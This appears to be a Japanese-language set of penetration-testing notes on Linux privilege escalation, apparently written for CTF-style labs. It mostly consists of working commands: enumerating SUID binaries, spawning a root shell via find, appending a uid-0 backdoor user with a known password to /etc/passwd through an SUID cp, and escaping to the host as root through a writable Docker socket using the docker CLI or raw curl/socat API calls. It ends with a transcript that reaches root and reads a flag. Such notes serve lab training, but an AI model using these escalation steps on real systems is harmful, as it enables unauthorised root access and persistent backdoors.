# SUID

```bash
sudo -l

# 例えば/bin/chmodがNOPASSWDであれば以下で特権昇格と同等
sudo chmod 777 /root
```

※linpeas.shする前にこれ確認すること



SUIDが付与されいているコマンドを列挙する

```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

以下のサイトから特権昇格可能かどうかを確認する

https://gtfobins.github.io/gtfobins/find/

```bash
find . -exec /bin/sh -p \; -quit
```



cpコマンドのSUIDでの特権昇格方法

https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/

* /etc/passwdの中身をコピーし、kali上で以下行を追加する

  ```
  hack:$1$hack$22.CgYt2uMolqeatCk9ih/:0:0:root:/root:/bin/bash
  ```

* 被害者端末に配送して/etc/passwdを上書する

  ```bash
  cp passwd1 /etc/passwd
  ```

* スイッチングする

  ```
  su hack
  Password: pass123
  ```

  

### Writable docker socks

docker ソケットは通常 /var/run/docker.sock にあり、root ユーザーと docker グループだけが書き込み可能です。
何らかの理由でそのソケットに書き込み権限がある場合は、特権をエスカレートすることができます。
以下のコマンドで権限を昇格させることができます。

```
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

docker パッケージを使わずにソケットから docker web API を使う
docker ソケットにはアクセスできるけど docker バイナリが使えない (インストールすらされていないかも) 場合は、curl を使って直接ウェブ API を使うことができます。
以下のコマンドは、ホストシステムのルートをマウントする docker コンテナを作成し、socat を使って新しい docker にコマンドを実行する方法の一例です。

```bash
# List docker images
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
#[{"Containers":-1,"Created":1588544489,"Id":"sha256:<ImageID>",...}]
# Send JSON to docker API to create the container
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
#{"Id":"<NewContainerID>","Warnings":[]}
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

最後のステップは、socat を使ってコンテナへの接続を開始し、"attach" リクエストを送信することである。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp

#HTTP/1.1 101 UPGRADED
#Content-Type: application/vnd.docker.raw-stream
#Connection: Upgrade
#Upgrade: tcp
```

これで、このsocat接続からコンテナ上でコマンドを実行できるようになりました。



上記例に従って以下コマンドを打ってみた。root特権を取得できた。驚き。

```bash
$ docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
root@b218afcff33e:/# whoami
whoami
root
```

```
root@b218afcff33e:~# cat proof.txt
cat proof.txt
93711eeddc98578e3e085c0dc21aa7e2
```

